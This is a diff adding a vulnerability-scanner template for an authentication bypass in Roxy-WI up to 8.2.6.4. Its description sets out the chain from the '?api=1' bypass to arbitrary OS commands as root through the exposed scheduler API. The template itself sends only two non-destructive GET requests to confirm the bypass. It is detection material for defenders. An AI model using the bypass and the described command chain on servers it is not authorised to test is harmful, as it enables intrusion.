@@ -1,0 +1,68 @@
+id: roxy-wi-ghsa-hqf9-xcvr-7xj5
+
+info:
+  name: Roxy-WI <= 8.2.6.4 - Unauthenticated Scheduler API (Auth Bypass -> os.system RCE)
+  author: Patrowl Security Team
+  severity: critical
+  description: |
+    Roxy-WI <= 8.2.6.4 skips authentication for any request whose URL contains the
+    substring "api" (app/login.py:19 uses `if 'api' not in request.url`), and mounts
+    flask_apscheduler's /scheduler/* API with SCHEDULER_API_ENABLED=True and no
+    SCHEDULER_AUTH, outside any blueprint's @jwt_required. An unauthenticated
+    attacker reaches the scheduler API by appending ?api=1, registers a job with
+    func="os:system" (resolved to os.system via APScheduler's ref_to_obj), and
+    triggers POST /scheduler/jobs/<id>/run to execute arbitrary OS commands as root,
+    then reads output back from the whitelisted /static/<file>?api=1. Fixed on
+    master by replacing the substring check with a proper endpoint allow-list.
+
+    This template is NON-DESTRUCTIVE: it proves the auth bypass and the exposed,
+    unauthenticated scheduler API (GET /scheduler/jobs returns 401 without the
+    bypass and 200 with ?api=1) without injecting or running any job.
+  reference:
+    - https://github.com/roxy-wi/roxy-wi/security/advisories/GHSA-hqf9-xcvr-7xj5
+    - https://intel.patrowl.io/cves/CVE-2026-45567
+    - https://cwe.mitre.org/data/definitions/78.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-78
+  metadata:
+    verified: true
+    max-request: 2
+    detection-mode: remote
+    shodan-query: http.favicon.hash:-\1835681456
+  tags: roxy-wi,rce,auth-bypass,apscheduler,cwe-78,unauth
+
+http:
+  - raw:
+      # 1) Control: the scheduler API requires auth without the bypass.
+      - |
+        GET /scheduler/jobs HTTP/1.1
+        Host: {{Hostname}}
+      # 2) Bypass: the same route with ?api=1 is served unauthenticated.
+      - |
+        GET /scheduler/jobs?api=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 401"      # auth required on the plain route
+          - "status_code_2 == 200"      # ?api=1 bypasses it
+        condition: and
+      - type: word
+        part: body_2
+        words:
+          - '"func":'
+          - '"trigger":'
+        condition: and
+
+    extractors:
+      - type: regex
+        part: body_2
+        name: job_funcs
+        group: 1
+        regex:
+          - '"func":\s*"([^"]+)"'
